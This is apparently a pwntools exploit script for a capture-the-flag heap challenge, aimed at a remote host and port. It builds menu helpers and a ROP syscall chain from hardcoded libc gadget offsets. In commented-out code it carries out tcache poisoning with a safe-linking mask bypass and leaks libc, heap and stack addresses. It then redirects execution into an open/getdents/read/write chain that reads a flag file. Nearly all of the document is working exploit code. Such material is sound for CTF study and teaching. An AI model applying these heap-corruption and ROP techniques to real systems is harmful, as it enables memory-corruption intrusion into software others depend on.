#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.172 --port 40901 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.172'
port = int(args.PORT or 40901)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        #,aslr=False
        return gdb.debug([exe.path] + argv,aslr=False, env={"LD_PRELOAD":"./libc.so.6"}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env={"LD_PRELOAD":"./libc.so.6"}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# 0x555555555480 #malloc
# 0x555555555645 #free
# 0x5555555555a5 #view
gdbscript = '''
# b *0x555555555480
#
# b *0x555555555645
#
# b *0x5555555555a5
continue
b *0x55555555550d
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


io = start()

libc = ELF("./libc.so.6")
# print hex(libc.sym['__free_hook'])
def create(size,msg):
    io.sendlineafter("> ", "1")
    io.sendlineafter(" : ",str(size))
    io.sendafter(" : ",str(msg))

def show(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter(" : ",str(idx))

def delete(idx):
    io.sendlineafter("> ", "3")
    io.sendlineafter(" : ",str(idx))

def syscall(rdi, rsi, rdx, rax):
    payload  = p64(libc.sym['pop_rax']) + p64(rax)
    payload += p64(libc.sym['pop_rdi']) + p64(rdi)
    payload += p64(libc.sym['pop_rsi']) + p64(rsi)
    payload += p64(libc.sym['pop_rdx_r12']) + p64(rdx) + p64(0)
    payload += p64(libc.sym['syscall'])
    return payload
# x/20gx 0x555555558040

libc.sym['pop_rax'] = 0x00045580
libc.sym['pop_rdi'] = 0x000c6980
libc.sym['pop_rsi'] = 0x0002ac3f
libc.sym['pop_rsp'] = 0x0003418a
libc.sym['pop_rdx_r12'] = 0x00114161
libc.sym['syscall'] = 0x000611ea

# for _ in range(8): # 0 -7
#     create(0x88, 'A' * 8) # size=0x80

# create(0x30, 'B' * 8) # 8
# create(0x20, 'C' * 8) # 9

# # masuk ke Unsorted Bin
# for _ in range(8):
#     delete(_) # 0 - 7
#
# create(0x28, '\x80') # 0

# show(0)
# io.recvuntil(" : ")
# data = io.recvline()[:-1]
# # print data
# # # print len(data)
# leak = u64(data.ljust(8, '\x00'))
# print hex(leak)
# libc.address = leak - 0x1e3c80
# print hex(libc.address)
#
# create(0x28, 'B' * 8) # 1
# create(0x28, 'B' * 8) # 2
#
# delete(1)
#
# create(0x28, 'B' * 0x28 + '\xa1') # 1
# create(0x30, 'H' * 8) # 3
#
# delete(3)
# delete(8)
# delete(2)
#
# create(0x98, 'C' * 0x38)
#
# show(2)
# io.recvuntil(" : ")
# heap = u64(io.recvline()[0x38:-1].ljust(8, '\x00'))
# print hex(heap)
#
# delete(2)
#
# mask = (heap >> 0xc) + 2
# print hex(mask)
# target = libc.sym['environ'] - 0x10
#
# create(0x98, 'C' * 0x28 + p64(0x41) + p64(target ^ mask))
#
# create(0x38, 'C' * 0x8)
# create(0x38, 'A' * 0x10)
#
# show(4)
# io.recvuntil(" : ")
# stack = u64(show(4)[0x10:].ljust(8, b'\0'))

# print hex(stack)

# create(0x20, 'A' * 8)
# create(0x40, 'A' * 8)
# create(0x40, 'A' * 8)
#
# delete(2)
# delete(1)
# show(0)
#
# create(0x28, 'B' * 8) # 1
# create(0x28, 'B' * 8) # 2
#
# delete(1)
#
# create(0x28, 'B' * 0x28 + '\xa1') # 1
# create(0x30, 'H' * 8)
#
# delete(3)
# delete(8)
# delete(2)
#
# # pause()
#
# create(0x98, 'C' * 0x38)
#
# show(2)
# io.recvuntil(" : ")
# data = io.recvline()[0x38:-1]
#
# heap = u64(data.ljust(8, '\x00'))
# print hex(heap)
#
# delete(2)
#
# mask = (heap >> 0xc) + 2
#
# target = libc.sym['environ'] - 0x10
#
# create(0x98, b'C' * 0x28 + p64(0x41) + p64(target ^ mask))
#
# create(0x38, 'C' * 0x8)
# create(0x38, 'A' * 0x10)
#
# show(4)
# io.recvuntil(" : ")
# data = io.recvline()[0x10:-1]
# stack = u64(data.ljust(8, b'\0'))
#
# print 'stack.leak', hex(stack)
# #
# create(0x58, 'X' * 8) # 5
# create(0x58, 'J' * 8)
# create(0x58, '1' * 8) # 8
# create(0x58, '2' * 8)
# create(0x58, '3' * 8)
# create(0x58, '4' * 8)
#
# delete(6)
#
# create(0x58, 'K' * 0x58 + '\xc1') # 6
#
# delete(7)
# delete(10)
# delete(8)
#
# mask = (heap + 0x23d0) >> 0xc
# rip = stack - 0x120 - 8
#
# create(0xb8, b'L' * 0x58 + p64(0x61) + p64(rip ^ mask)) # 7
#
# # file_path_ptr
# # create(0x58, 'flag_ae46b56ca9599760.txt\0')
# create(0x58, './flag_ae46b56ca9599760.txt\x00')
#
# file_path_ptr = heap + 0x23d0
# rop_address   = heap + 0x24f0
#
# # define __NR_read 0
# # define __NR_write 1
# # define __NR_open 2
# # define __NR_getdents 78
#
# payload  = syscall(file_path_ptr, 0, 0, rax=2)
# payload += syscall(5, file_path_ptr, 0x100, rax=78)
# payload += syscall(5, file_path_ptr, 0x100, rax=0)
# payload += syscall(1, file_path_ptr, 0x100, rax=1)
#
# create(0x3D0, payload)
#
# payload  = p64(libc.sym['pop_rsp'])
# payload += p64(rop_address)
#
# # pause()
#
# create(0x58, b'J' * 8 + payload)

io.interactive()
